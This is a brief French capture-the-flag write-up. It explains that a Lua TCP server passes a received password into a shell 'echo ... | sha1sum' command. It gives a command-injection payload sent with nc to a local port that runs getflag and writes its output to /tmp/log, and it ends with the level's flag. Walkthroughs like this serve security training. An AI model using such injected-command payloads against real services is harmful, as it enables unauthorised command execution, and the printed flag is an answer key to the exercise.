1. En regardant le fichier lua on comprends que le serveur tcp ecoute pour un mot de passe pui execute cette commande shell `echo "..pass.." | sha1sum`
2. Il suffit d'ecrire le payload suivant
```
echo '$(getflag) > /tmp/log && echo -n NotSoEasy' | nc 127.0.0.1 5151; cat /tmp/log
```

> Flag: fa6v5ateaw21peobuub8ipe6s